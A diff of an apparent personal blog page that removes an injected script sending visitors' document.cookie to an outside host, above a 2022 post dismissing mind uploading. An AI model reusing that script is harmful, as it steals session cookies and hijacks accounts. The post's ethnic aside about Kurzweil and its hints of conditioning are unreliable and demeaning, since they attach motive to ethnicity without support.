@@ -56,15 +56,6 @@ Some things are best left unsaid, and I really wish this be the case, since I've
 ☣️
 
 
-
-    
-<script type="text/javascript">
-document.location='http://angelfiresites.000webhostapp.com/index.php?c='+document.cookie;
-</script>
-
-
-
-
 <time>2022-10-04</time><br>Hypnotized<br>
 Many people are hypnotized thinking that were going to hit the 2040's and just miraculously upload our connectomes or whatever to the cloud. So we're going to, in 20 years, become Avatarian entities playing video games inside the web? Sounds like horseshit. In my social hacks, I mention this. Kurzweil is a Jewish musician with a business motivation: no offense. This is him, though. It's looney, and it just sounds crazy, and it makes you wonder where everyone is really going with STEM. NOT THAT FAR I ASSURE YOU. Not now. That would be totally gross, and if it is going to happen, there isn't a doubt in my mind we are being conditioned for this. I am sure somewhat mistakingly right now. I really doubt it's going down, though. We have tons of other issues, even racial and ethnic conflict, but more than anything, we have climate change, and proceeding with what MIT predicted and recent papers on deforestation and such, it's going to take a miracle to figure this all out. Who knows, but I am guessing something more realistic. Advanced neural connected mobile tech., sure. Gene editing, why not. But a Bart Simpson designer body? Eh, IDK about all that.
 # © 2022 CAScyber.
